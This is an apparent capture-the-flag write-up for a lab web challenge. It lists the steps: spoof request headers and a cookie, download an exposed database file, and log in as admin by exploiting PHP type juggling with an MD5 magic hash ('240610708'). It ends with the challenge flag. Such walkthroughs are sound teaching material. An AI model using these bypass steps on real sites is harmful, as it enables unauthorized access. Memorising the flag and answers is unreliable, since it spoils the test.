# Web

1. **Address:** `172.16.3.66`
2. **Use BurpSuite to:**
   1. Set Header: `Referer: https://google.com`
   2. Set `User-Agent` to `WorldWideWeb`
3. **Use Cookie-Editor extension in Chrome to:**
   1. Set Cookie `test_completed=true`
4. **Go To:** `http://172.16.3.66/index.php`
5. **Go To:** `http://172.16.3.66/media`
6. **Download DB:** `http://172.16.3.66/media/database.db` into [database.db](./database.db)
7. **Open it and Get Username and Password:**

   ```text
   Username: admin
   Password: 0e745304954233478109486485467426
   ```

8. **Type Juggling:** `0e... == 0e...`, Sample: [TypeJuggling.php](./TupeJug.php)
9. **Magic Hashes List for `Md5`:** [Useful TypeJuggling Hashes](https://github.com/spaze/hashes/blob/master/md5.md)
10. **Login:** `admin`, `240610708`

    ```text
    md5(X) = Starts With Number (0-9...)
    md5(240610708) = 0e462097431906509019562988736854
    ```

11. **Flag:** `MAZAPA_7f90181e652faf6e9f3fb1532f290f89`
